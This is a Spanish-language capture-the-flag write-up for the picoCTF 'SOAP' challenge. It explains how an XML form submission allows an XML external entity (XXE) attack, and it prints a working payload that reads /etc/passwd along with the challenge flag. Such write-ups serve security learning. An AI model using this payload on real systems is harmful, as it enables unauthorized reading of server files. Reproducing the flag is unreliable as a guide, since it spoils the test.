# Reto: SOAP

## Descripción

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

## Solución

Al analizar la página, nos dábamos cuenta que los mosaicos que se mostraban formaban parte de un formulario que mandaba un número al server según nuestra elección, y lo importante, que este POST enviaba los datos en formato XML.

Esto nos daba la oportunidad de utilizar una vulnerabilidad XXE, que permite definir 'variables' en el código de XML para usarlas en el código. El tema es que estas variables también pueden ser cosas como archivos. Dada esta información, creábamos un payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY payload SYSTEM "file:///etc/passwd">
]>
<data>
    <ID>
        &payload; <!-- Originalmente aquí había sólo un 1, 2 o 3 -->
    </ID>
</data>
```

Se nos regresa el contenido del archivo /etc/passwd, donde venía la flag.

`picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}`

## Notas

Se utilizó BurpSuite para ver y analizar los contenidos de las peticiones.
